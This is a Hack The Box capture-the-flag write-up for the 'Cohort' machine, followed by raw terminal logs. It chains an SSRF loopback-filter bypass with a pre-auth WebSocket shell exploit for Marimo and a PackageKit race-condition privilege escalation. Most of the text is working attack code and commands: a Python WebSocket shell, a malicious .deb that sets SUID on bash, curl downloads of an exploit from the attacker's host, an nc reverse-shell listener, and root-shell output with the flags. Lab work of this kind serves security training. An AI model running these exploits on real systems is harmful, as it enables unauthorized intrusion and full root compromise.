@@ -1,0 +1,474 @@
+Phase 1 — Reconnaissance
+1.1 Setup
+# Set MTU for HTB VPN (prevents packet loss)
+sudo ip link set dev tun0 mtu 1300
+
+# Add target to /etc/hosts
+echo "10.129.103.0 cohort.htb" | sudo tee -a /etc/hosts
+
+Command	Explanation
+ip link set dev tun0 mtu 1300	Reduces Maximum Transmission Unit on the VPN tunnel to avoid fragmentation issues with HTB's infrastructure
+echo ... | sudo tee -a /etc/hosts	Appends the target IP→hostname mapping so your system resolves cohort.htb to the correct IP
+
+1.2 Port Scan
+nmap -p- --min-rate 2000 -T4 -Pn 10.129.103.0
+nmap -p22,80,443 -sCV -Pn 10.129.103.0
+
+Flag	Explanation
+-p-	Scan all 65535 ports
+--min-rate 2000	Send at least 2000 packets/sec (speeds up scan)
+-T4	Aggressive timing template
+-Pn	Skip host discovery (HTB blocks ping)
+-sCV	Script-based version detection on open ports
+
+Results:
+
+Port	Service	Notes
+22	SSH	OpenSSH (no creds known)
+80	HTTP	nginx → 301 redirect to HTTPS
+443	HTTPS	nginx, TLS cert has SAN *.cohort.htb (wildcard = hidden vhosts exist)
+
+Key observation: The wildcard cert *.cohort.htb hints that other subdomains (like nb-*.cohort.htb) are valid — we'll find one later. 
+
+Phase 2 — Web Enumeration
+2.1 Access the Site
+curl -sk https://cohort.htb/
+
+Flag	Explanation
+-s	Silent mode (no progress bar)
+-k	Insecure — skip TLS cert verification (self-signed cert)
+
+The site is a Cohort Analytics SPA (Single Page Application) — a JavaScript frontend that talks to a backend API. 
+
+2.2 Directory Fuzzing
+feroxbuster -u https://cohort.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -r --depth 3 -k
+
+Flag	Explanation
+-u	Target URL
+-w	Wordlist to fuzz
+-r	Recursive (follow found paths deeper)
+--depth 3	Max recursion depth
+-k	Insecure — accept self-signed TLS certs (critical for HTB)
+
+Discovered endpoints:
+
+Endpoint	Purpose
+/api/validate	Accepts a URL and fetches it server-side → SSRF
+/status	Returns backend/upstream info (403 from external IP, but accessible via SSRF)
+/api/health	Health check
+
+Phase 3 — SSRF Discovery & Bypass
+3.1 What is SSRF?
+Server-Side Request Forgery — the server fetches a URL you specify. If it doesn't properly filter internal addresses, you can make it access localhost services that are not exposed externally.
+
+3.2 The Filter
+The /api/validate endpoint blocks obvious loopback addresses like 127.0.0.1, 0.0.0.0, localhost. 
+
+3.3 Bypass — Alternate IP Encodings
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.1/","format":"csv"}'
+
+Why it works: 127.1 is a valid shorthand for 127.0.0.1 in many URL parsers. The blocklist checks for the string 127.0.0.1 but not 127.1. 
+
+Other bypasses that work:
+
+http://[::ffff:7f00:1]/ (IPv6-mapped IPv4)
+http://2130706433/ (decimal representation of 127.0.0.1)
+Phase 4 — Internal Service Discovery
+4.1 Port Scan via SSRF
+for port in 5000 8888 8080 3000 9000; do
+  curl -sk -X POST https://cohort.htb/api/validate \
+    -H "Content-Type: application/json" \
+    -d "{\"url\":\"http://127.1:${port}/\",\"format\":\"csv\"}"
+done
+
+Results:
+
+Port	Service	Details
+5000	Flask API	POST-only, dead end
+8888	Marimo 0.20.4	Python notebook server, loopback-only
+
+4.2 Confirm Marimo Version
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.1:8888/api/version","format":"csv"}'
+
+Returns: 0.20.4
+
+4.3 Vhost Discovery via /status
+curl -sk -X POST https://cohort.htb/api/validate \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.1/status","format":"csv"}'
+
+The /status endpoint (normally 403 from outside) is accessible via SSRF and reveals:
+
+upstream: nb-1be3782a8afd3ad5.cohort.htb → 127.0.0.1:8888
+
+This is the nginx vhost that reverse-proxies to the internal Marimo instance. 
+
+4.4 Add Vhost to /etc/hosts
+echo "10.129.103.0 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
+
+Now https://nb-1be3782a8afd3ad5.cohort.htb routes through nginx → internal Marimo on :8888, including WebSocket upgrades.  This is critical because SSRF cannot forge WebSocket connections.
+
+Phase 5 — Foothold: CVE-2026-39987 (Marimo Pre-Auth RCE)
+5.1 Vulnerability Explanation
+Field	Detail
+CVE	CVE-2026-39987
+Affected	Marimo < 0.23.0 (target runs 0.20.4)
+Type	Missing authentication on WebSocket endpoint
+Root Cause	The /terminal/ws WebSocket route never calls validate_auth(), unlike all other endpoints.  Any client that completes the WebSocket handshake gets a live PTY (pseudo-terminal) shell as the marimo user.
+
+In plain terms: Marimo has a terminal feature accessible via WebSocket. The developer forgot to add the auth check on this specific route. Connect to the WebSocket → you get a shell. 
+
+5.2 Exploit
+# shell.py — Interactive WebSocket shell
+import ssl, sys, threading, websocket
+
+url = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"
+
+ws = websocket.create_connection(url, sslopt={"cert_reqs": ssl.CERT_NONE})
+
+def receive():
+    while True:
+        try:
+            data = ws.recv()
+            if isinstance(data, bytes):
+                data = data.decode(errors="replace")
+            sys.stdout.write(data)
+            sys.stdout.flush()
+        except:
+            break
+
+threading.Thread(target=receive, daemon=True).start()
+print("[+] Interactive shell ready.")
+for line in sys.stdin:
+    ws.send(line.rstrip("\n") + "\n")
+
+How it works:
+
+Line	Purpose
+websocket.create_connection(url, ...)	Opens TLS + WebSocket connection to /terminal/ws
+sslopt={"cert_reqs": ssl.CERT_NONE}	Accepts self-signed cert
+threading.Thread(target=receive, ...)	Background thread that prints server output
+for line in sys.stdin: ws.send(...)	Sends your keystrokes to the server's PTY
+
+5.3 Run
+python3 shell.py
+
+You get: marimo@cohort:~$
+
+5.4 Grab User Flag
+cat /home/marimo/user.txt
+# 932b104fabb98b341d34e6e7cfabd70d
+
+Phase 6 — Privilege Escalation: CVE-2026-41651 (Pack2TheRoot)
+6.1 Vulnerability Explanation
+Field	Detail
+CVE	CVE-2026-41651
+Alias	Pack2TheRoot
+Affected	PackageKit 1.0.2 – 1.3.4 (target: 1.2.8)
+CVSS	8.8 (High)
+Type	TOCTOU Race Condition (CWE-367)
+Impact	Unprivileged user → root (arbitrary package install as root)
+
+What is PackageKit? A D-Bus daemon that abstracts package management (apt, dnf, pacman) behind a unified API. GUIs like GNOME Software use it.  It runs as root and requires polkit authentication for privileged operations. 
+
+The 3 bugs in src/pk-transaction.c:
+
+#	Bug	Location	Effect
+1	Unconditional flag overwrite	Line 4036	InstallFiles() writes caller-supplied flags to transaction->cached_transaction_flags without checking if the transaction is already authorized/running
+2	Silent state-transition rejection	Lines 873–882	pk_transaction_set_state() silently discards backward transitions (e.g. RUNNING → WAITING_FOR_AUTH) but the flag overwrite already happened
+3	Late flag read at execution	Lines 2273–2277	The scheduler's idle callback reads cached_transaction_flags at dispatch time, not at authorization time
+
+Exploitation sequence:
+
+┌─────────────────────────────────────────────────────────────────┐
+│  1. Call InstallFiles(SIMULATE, dummy.deb)                      │
+│     → polkit check is SKIPPED for SIMULATE mode                 │
+│     → Transaction state → READY                                 │
+│                                                                 │
+│  2. IMMEDIATELY call InstallFiles(NONE, payload.deb)            │
+│     → Overwrites cached_transaction_flags + file path           │
+│     → Race window: before GLib idle handler fires               │
+│                                                                 │
+│  3. GLib idle handler fires → reads corrupted flags             │
+│     → dpkg -i payload.deb runs AS ROOT                          │
+│     → postinst script executes with uid=0                       │
+└─────────────────────────────────────────────────────────────────┘
+
+6.2 Confirm Vulnerability
+dpkg -l | grep packagekit
+# packagekit  1.2.8-2ubuntu1.2   ← VULNERABLE (< 1.3.5)
+
+6.3 Build Payload .deb
+On your local machine:
+
+mkdir -p /tmp/payload/DEBIAN
+
+# Control file
+cat > /tmp/payload/DEBIAN/control <<'EOF'
+Package: payload
+Version: 1.0
+Architecture: amd64
+Maintainer: attacker
+Description: exploit
+EOF
+
+# Post-install script — runs as root during dpkg -i
+cat > /tmp/payload/DEBIAN/postinst <<'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+chmod +x /tmp/payload/DEBIAN/postinst
+
+# Build the .deb
+dpkg-deb --build --root-owner-group /tmp/payload /tmp/payload.deb
+
+Component	Purpose
+DEBIAN/control	Package metadata (required by dpkg)
+DEBIAN/postinst	Script executed after install — here it sets SUID bit on /bin/bash
+dpkg-deb --build	Packages files into a valid .deb
+--root-owner-group	Sets ownership to root:root (avoids warning)
+
+6.4 Serve & Transfer
+# Local machine — serve files
+cd /tmp
+python3 -m http.server 8000
+
+# Target (marimo shell)
+cd /tmp
+curl http://10.10.14.27:8000/payload.deb -o payload.deb
+
+6.5 Run the Exploit
+Use the Python exploit from 0xBlackash/CVE-2026-41651:
+
+# Local machine
+git clone https://github.com/0xBlackash/CVE-2026-41651
+cd CVE-2026-41651
+python3 -m http.server 8000
+
+# Target
+curl http://10.10.14.27:8000/cve-2026-41651.py -o /tmp/exploit.py
+python3 /tmp/exploit.py
+
+The exploit:
+
+Creates a dummy .deb (for the SIMULATE call)
+Creates the payload .deb (postinst → chmod +s /bin/bash)
+Fires both D-Bus InstallFiles calls in rapid succession
+The race wins → dpkg -i payload.deb runs as root → SUID bash created 
+6.6 Get Root
+/bin/bash -p
+id
+# uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
+
+cat /root/root.txt
+# 9809ac4988b56295c56993ef567410a2
+
+Why -p? The -p flag tells bash to preserve the effective UID. Without it, bash drops to the real UID (1000/marimo) on startup, and you lose root.
+
+Summary of Vulnerabilities
+#	CVE / Issue	Component	Type	Impact
+1	Incomplete SSRF filter	/api/validate	Blocklist bypass via IP encoding	Internal service access
+2	Info disclosure	/status endpoint	IP-based ACL bypassed via SSRF	Internal vhost hostname leaked
+3	CVE-2026-39987	Marimo 0.20.4	Missing auth on /terminal/ws	Pre-auth RCE as marimo
+4	CVE-2026-41651	PackageKit 1.2.8	TOCTOU race on transaction flags	Local LPE → root
+
+Remediation (for reference)
+Issue	Fix
+SSRF in /api/validate	Use an allowlist of permitted destinations; resolve and validate the final IP after DNS resolution
+/status endpoint	Never expose upstream hostnames; restrict to localhost-only with proper auth
+Marimo pre-auth RCE	Upgrade to Marimo ≥ 0.23.0; never expose notebook servers without auth on all endpoints
+PackageKit TOCTOU	Upgrade to PackageKit ≥ 1.3.5
+General	Principle of least privilege — marimo user should not be able to trigger privileged D-Bus transactions
+
+Flags
+Flag	Value
+User	932b104fabb98b341d34e6e7cfabd70d
+Root	9809ac4988b56295c56993ef567410a2
+###################################################################
+
+──(white㉿white)-[~/white/Documents/htb]
+└─$ ping 10.129.103.0 
+PING 10.129.103.0 (10.129.103.0) 56(84) bytes of data.
+64 bytes from 10.129.103.0: icmp_seq=1 ttl=63 time=288 ms
+64 bytes from 10.129.103.0: icmp_seq=2 ttl=63 time=278 ms
+64 bytes from 10.129.103.0: icmp_seq=3 ttl=63 time=310 ms
+64 bytes from 10.129.103.0: icmp_seq=4 ttl=63 time=312 ms
+64 bytes from 10.129.103.0: icmp_seq=5 ttl=63 time=345 ms
+^C
+--- 10.129.103.0 ping statistics ---
+6 packets transmitted, 5 received, 16.6667% packet loss, time 5007ms
+rtt min/avg/max/mdev = 278.233/306.552/345.319/23.268 ms
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ sudo ip link set dev tun0 mtu 1300
+echo "10.129.103.0 cohort.htb" | sudo tee -a /etc/hosts
+nmap -p- --min-rate 2000 -T4 -Pn 10.129.103.0
+nmap -p22,80,443 -sCV -Pn 10.129.103.0
+[sudo] password for white: 
+10.129.103.0 cohort.htb
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 09:56 +0530
+Warning: 10.129.103.0 giving up on port because retransmission cap hit (6).
+Nmap scan report for cohort.htb (10.129.103.0)
+Host is up (0.38s latency).
+Not shown: 61221 closed tcp ports (reset), 4311 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 170.07 seconds
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 09:59 +0530
+Nmap scan report for cohort.htb (10.129.103.0)
+Host is up (0.35s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp  open  http     nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://cohort.htb/
+443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
+| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
+| Not valid before: 2026-06-01T18:47:07
+|_Not valid after:  2126-05-08T18:47:07
+|_http-title: Cohort Analytics
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   http/1.1
+|   http/1.0
+|_  http/0.9
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up)
+  
+  scanned in 30.11 seconds
+
+  ──(white㉿white)-[~/white/Documents/htb]
+└─$ feroxbuster -u https://cohort.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -r --depth 3 -k   
+                                                                                                                                                                       
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher                    ver: 2.13.1
+───────────────────────────┬──────────────────────
+     Target Url            │ https://cohort.htb/
+     In-Scope Url          │ cohort.htb
+     Threads               │ 50
+     Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+     Status Codes          │ All Status Codes!
+     Timeout (secs)        │ 7
+     User-Agent            │ feroxbuster/2.13.1
+     Config File           │ /etc/feroxbuster/ferox-config.toml
+     Extract Links         │ true
+     HTTP methods          │ [GET]
+     Insecure              │ true
+     Follow Redirects      │ true
+     Recursion Depth       │ 3
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET       22l       68w      908c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+405      GET        1l        6w       47c https://cohort.htb/api/
+403      GET        7l       10w      162c https://cohort.htb/assets/
+403      GET        7l       10w      162c https://cohort.htb/status
+[####################] - 8m    124564/124564  0s      found:3       errors:0      
+[####################] - 8m     62282/62282   124/s   https://cohort.htb/ 
+[####################] - 8m     62282/62282   126/s   https://cohort.htb/assets/
+
+─(white㉿white)-[~/white/Documents/htb]
+└─$ rlwrap nc -lvnp 9001
+listening on [any] 9001 ...
+id
+
+──(white㉿white)-[~/white/Documents/htb]
+└─$ # Generate a port list and fuzz through the SSRF
+for port in 8888 8080 5000 3000 9000; do
+  curl -sk -X POST https://cohort.htb/api/validate \
+    -H "Content-Type: application/json" \
+    -d "{\"url\":\"http://127.1:${port}/\",\"format\":\"csv\"}"
+done
+{"ok": true, "fetched_status": 200, "content_type": "text/html; charset=utf-8", "preview": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>marimo</title>\n</head>\n<body style=\"\n    background-color: #f4f4f9;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    height: 100vh;\n    margin: 0;\">\n  <form method=\"POST\" action=\"/auth/login\" style=\"\n    padding: 20px;\n    background-color: white;\n    border-radius: 8px;\n    box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n    width: 300px;\n    text-align: center;\">\n    <div style=\"margin-bottom: 20px;\">\n      <label for=\"password\" style=\"\n        display: block;\n        margin-bottom: 5px;\n        font-size: 16px;\n        font-family: Arial, sans-serif;\n        color: #333;\">Access Token / Password</label>\n      <input id=\"password\" name=\"password\" type=\"password\" style=\"\n        width: 100%;\n        box-sizing: border-box;\n        padding: 8px;\n        border: 1px solid #ccc;\n        border-radius: 4px;\">\n    </div>\n    <button type=\"submit\" style=\"\n        background-color: #1C7362;\n        color: white;\n        padding: 10px 20px;\n        border: none;\n        border-radius: 4px;\n        cursor: pointer;\n        width: 100%;\n        font-size: 16px;\">Login</button>\n    <p style=\"color: red;\"></p>\n  </form>\n</body>\n</html>\n", "message": "Source reachable."}{"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}{"ok": true, "fetched_status": 405, "content_type": "application/json", "preview": "{\"ok\": false, \"message\": \"Method not allowed.\"}", "message": "Source responded with an error status."}{"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}{"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ echo "10.129.103.0 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts   
+10.129.103.0 nb-1be3782a8afd3ad5.cohort.htb
+
+
+connect to [10.10.14.27] from (UNKNOWN) [10.129.103.0] 36868
+marimo@cohort:~$ id
+uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
+marimo@cohort:~$ 
+marimo@cohort:~$ 
+marimo@cohort:~$ ls             ls
+ls
+notebooks
+user.txt
+marimo@cohort:~$ cat user.txt   cat user.txt
+cat user.txt
+932b104fabb98b341d34e6e7cfabd70d
+marimo@cohort:~$ 
+
+
+─(white㉿white)-[~/white/Documents/htb]
+└─$ python shell.py 
+[+] Interactive shell ready. Type commands below.
+marimo@cohort:~$ cd /tmp
+cd /tmp
+marimo@cohort:/tmp$ curl http://10.10.14.27:8000/cve-2026-41651.py -o cve-2026-41651.py
+curl http://10.10.14.27:8000/cve-2026-41651.py -o cve-2026-41651.py
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 19157  100 19157    0     0  19041      0  0:00:01  0:00:01 --:--:-- 19061
+marimo@cohort:/tmp$ python3 cve-2026-41651.py
+python3 cve-2026-41651.py
+═══════════════════════════════════════════════════
+ CVE-2026-41651 / PackageKit TOCTOU LPE
+═══════════════════════════════════════════════════
+[*] PackageKit 1.2.8 (VULNERABLE)
+[*] Building packages (pure Python)...
+[+] dummy   : /tmp/.pk-dummy-2109.deb
+[+] payload : /tmp/.pk-payload-2109.deb
+[*] Transaction : /2_bbdeddbd
+[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
+[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
+[*] Waiting for dispatch (30 s max)...
+[!] PK error 48: Failed to obtain authentication.
+[*] Finished (exit=2, 0 ms)
+[*] Polling for payload (120 s max)...
+[*] t+1s: payload=exists dpkg_lock=free suid=not yet
+[*] t+2s: payload=exists dpkg_lock=free suid=not yet
+[*] t+3s: payload=exists dpkg_lock=free suid=not yet
+
+[+] SUCCESS: SUID bash at /tmp/.suid_bash
+[*] Spawning root shell via /tmp/.suid_bash -p ...
+.suid_bash-5.2# ls
+ls
+cve-2026-41651.py
+snap-private-tmp
+systemd-private-8e6f5a9e16724d2cb2de79d2e3f53d5a-cohort-insights.service-1oYDK4
+systemd-private-8e6f5a9e16724d2cb2de79d2e3f53d5a-fwupd.service-txNLcN
+systemd-private-8e6f5a9e16724d2cb2de79d2e3f53d5a-ModemManager.service-GRxOSJ
+systemd-private-8e6f5a9e16724d2cb2de79d2e3f53d5a-polkit.service-vTnEa3
+systemd-private-8e6f5a9e16724d2cb2de79d2e3f53d5a-systemd-logind.service-hQuh3S
+systemd-private-8e6f5a9e16724d2cb2de79d2e3f53d5a-systemd-resolved.service-Mmljls
+systemd-private-8e6f5a9e16724d2cb2de79d2e3f53d5a-systemd-timesyncd.service-2Vevr0
+systemd-private-8e6f5a9e16724d2cb2de79d2e3f53d5a-upower.service-8fkYFd
+vmware-root_906-2688554163
+.suid_bash-5.2# /tmp/.suid_bash -p
+/tmp/.suid_bash -p
+.suid_bash-5.2# id
+id
+uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
+.suid_bash-5.2# cat /root/root.txt
+cat /root/root.txt
+9809ac4988b56295c56993ef567410a2
+.suid_bash-5.2# 
+
